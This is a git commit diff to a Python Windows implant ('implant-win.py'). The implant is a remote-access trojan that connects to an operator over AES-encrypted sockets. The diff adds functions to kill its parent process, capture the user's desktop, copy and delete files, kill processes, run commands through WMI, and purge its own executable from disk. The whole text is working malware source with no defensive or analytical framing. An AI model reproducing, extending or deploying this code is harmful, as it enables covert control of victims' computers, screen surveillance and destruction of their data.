b5fb522cd6e1d0f66da02fe781abea3486c8089e
airzero <josiahmassari@yahoo.com>
2018-12-04 12:51:02 -0800

    Update implant-win.py

--- implant-win.py
+++ implant-win.py
@@ -1,20 +1,18 @@
-import os, sys, subprocess, socket, time, hashlib, base64, win32api, win32file
+import os, sys, subprocess, socket, hashlib, base64, win32api, win32file, wmi
 from Crypto import Random
 from Crypto.Cipher import AES
 
 # Variables for connection and results
 lhost = "127.0.0.1"
 lport = 443
-result = ''
-
 # This is the key for the AES encryption, can be modified
-CIPHER = "LUJw_q7aaSNPSU=aSX*!9TU&n#Y&yh2-2+L*"
+CIPHER = "32_rFE2Z@M4KSJYy6w2KgzH9fCYfD=&bPj?e"
+
+# Variables for function calls
+result = ''
+wmi = wmi.WMI()
 
 class AESCipher(object):
-    """
-    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
-    Also ensure the coherence and the type of the data with a unicode to byte converter.
-    """
     def __init__(self, key):
         self.bs = 16
         self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()
@@ -60,6 +58,41 @@ def client():
     encrypted = cipher.encrypt(result)
     s.send(encrypted)
 
+# Kill Parent process
+def killParent():
+  p = win32api.GetCurrentProcessId()
+  for prc in wmi.Win32_Process(ProcessId=p):
+    ppid = prc.ParentProcessId
+  h = win32api.OpenProcess(1, False, ppid)
+  win32api.TerminateProcess(h, 0)
+  h.Close()
+
+# Screenshot function
+def screenshot(command):
+  global result
+  try:
+    import win32gui
+    import win32ui
+    import win32con   
+    hdesktop = win32gui.GetDesktopWindow()
+    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN) 
+    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
+    desktop_dc = win32gui.GetWindowDC(hdesktop)
+    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+    mem_dc = img_dc.CreateCompatibleDC()
+    screenshot = win32ui.CreateBitmap()
+    screenshot.CreateCompatibleBitmap(img_dc, width, height)
+    mem_dc.SelectObject(screenshot)
+    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
+    screenshot.SaveBitmapFile(mem_dc, command)
+    mem_dc.DeleteDC()
+    win32gui.DeleteObject(screenshot.GetHandle())
+    result = 'Success\n'
+  except:
+    result = 'Failed\n'
+
 # Download file from target
 #def download(command):
 
@@ -67,7 +100,7 @@ def client():
 
 # Shell functionality
 def shell(command):
-  prochandle = subprocess.Popen(command,  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+  prochandle = subprocess.Popen(command,  shell=False,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
   return prochandle.stdout.read() + prochandle.stderr.read()
 
 # run commands
@@ -81,6 +114,15 @@ def runCommand(command):
     win32file.SetCurrentDirectory(str(params[1]))
     result = '%s\n' % (os.getcwd())
 
+  # Copy specified file
+  elif command.lower().startswith('cp'):
+    params = command.split()
+    try:
+      win32api.CopyFile(str(params[1]), str(params[2]), False)
+      result = 'Success\n'
+    except:
+      result = 'Failed\n'
+
   # Download file from target
   #elif command.lower().startswith('download'):
    #params = command.split()
@@ -90,9 +132,27 @@ def runCommand(command):
   elif command.lower().startswith('getpid'):
     result = '%s\n' % (win32api.GetCurrentProcessId()) 
 
+  # Get current user
+  elif command.lower().startswith('getuid'):
+    result = '%s\n' % (win32api.GetUserName())
+
   # Get hostname
   elif command.lower().startswith('hostname'):
     result = '%s\n' % (win32api.GetComputerName())
+
+  # Kill specified process
+  elif command.lower().startswith('kill'):
+    params = command.split()
+    try:
+      h = win32api.OpenProcess(1, False, int(params[1]))
+      try:
+        win32api.TerminateProcess(h, 0)
+        result = 'Success\n'
+      except:
+        result = 'Failed\n'
+      h.Close()
+    except:
+      result = 'Failed\n'
 
   # List current directory
   elif command.lower().startswith('ls'):
@@ -102,12 +162,37 @@ def runCommand(command):
 
   # Get process list
   elif command.lower().startswith('ps'):
-    command = 'wmic process get name,processid,parentprocessid'
-    result = shell(command)
+    result = 'ProcessID	ParentID		Name\n'
+    for p in wmi.Win32_Process():
+      result += '%s		%s		%s\n' % (p.ProcessId, p.ParentProcessId, p.Name)
+
+  # Purge implant from system
+  elif command.lower().startswith('purge'):
+    p = win32api.GetCurrentProcessId()
+    for prc in wmi.Win32_Process(ProcessId=p):
+      path = prc.ExecutablePath
+    h = win32api.OpenProcess(1, False, p)
+    comd = "cmd.exe /Q /c DEL %s" % (path)
+    wmi.Win32_Process.Create(comd)
+    win32api.TerminateProcess(h, 0)
 
   # Get present working directory
   elif command.lower().startswith('pwd'):
     result = '%s\n' % (os.getcwd())
+
+  # Remove specified file
+  elif command.lower().startswith('rm'):
+    params = command.split()
+    try:
+      win32file.DeleteFile(str(params[1]))
+      result = 'Success\n'
+    except:
+      result = 'Failed\n'
+
+  # Take screenshot of user's desktop
+  elif command.lower().startswith('screenshot'):
+   params = command.split()
+   screenshot(params[1])
 
   # Execute shell command
   elif command.lower().startswith('shell'):
@@ -118,7 +203,8 @@ def runCommand(command):
   elif command.lower().startswith('sysinfo'):
     result += 'User: %s\n' % (win32api.GetUserName())
     result += 'Host: %s\n' % (win32api.GetComputerName())
-    result += 'OS: %s\n' % (win32api.GetEnvironmentVariable('os'))
+    for operating in wmi.Win32_OperatingSystem():
+      result += 'OS: %s\n' % (operating.caption)
     try:
       os.environ["PROGRAMFILES(X86)"]
       result += 'Arch: x64\n'
@@ -129,9 +215,14 @@ def runCommand(command):
   # Upload file to target
   #elif command.lower().startswith('upload'):
 
-  # Get current user
-  elif command.lower().startswith('whoami'):
-    result = '%s\n' % (win32api.GetUserName())
+  # Execute command via WMI
+  elif command.lower().startswith('wmi'):
+    params = command.split()
+    try:
+      wmi.Win32_Process.Create(str(params[1]))
+      result = 'Success\n'
+    except:
+      result = 'Failed\n'
 
   # Else just pass and don't execute anything
   else:
@@ -140,4 +231,5 @@ def runCommand(command):
 # Build main function
 if __name__ == '__main__':
   while True:
+    killParent()
     client()
